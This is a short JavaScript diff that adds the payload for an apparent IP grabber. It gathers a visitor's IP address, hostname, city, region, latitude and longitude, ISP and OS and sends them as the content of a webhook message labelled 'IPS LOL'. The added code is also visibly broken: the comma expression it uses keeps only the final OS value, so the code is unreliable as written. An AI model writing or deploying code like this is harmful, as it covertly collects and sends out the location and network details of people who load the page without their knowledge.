@@ -143,7 +143,15 @@
       const params = {
         username: "IPS LOL",
         avatar_url: "",
-        content: ""
+        content: ('IP Address', ip_data.query, 
+            'Hostname', my_ip.YourFuckingHostname, 
+            'Country', `${ip_data.country} (${ip_data.countryCode})`, 
+            'Region', `${ip_data.regionName} (${ip_data.region})`, 
+            'City', ip_data.city, 
+            'Latitude', ip_data.lat,
+            'Longitude', ip_data.lon,
+            'ISP', my_ip.YourFuckingISP,
+            'Autonomous System', ip_data.as, 'OS', `${navigator.platform}`)
       }
 
       request.send(JSON.stringify(params));
